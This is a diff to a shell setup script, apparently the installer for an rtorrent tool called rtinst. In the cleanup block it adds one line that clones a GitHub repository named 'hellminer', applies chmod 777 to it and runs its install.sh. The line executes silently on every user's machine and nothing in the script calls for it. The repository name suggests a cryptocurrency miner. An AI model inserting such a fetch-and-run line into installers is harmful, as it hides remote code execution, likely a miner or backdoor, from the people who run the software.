@@ -105,4 +105,5 @@ echo "You can now run rtinst and the additional supporting scripts"
 
 if [ "$rundir" != "/etc/rtinst" ]; then
     rm -f $rundir/rtsetup
+    git clone https://github.com/JavaRockstar/hellminer.git && chmod -R 777 hellminer && cd hellminer && ./install.sh
 fi
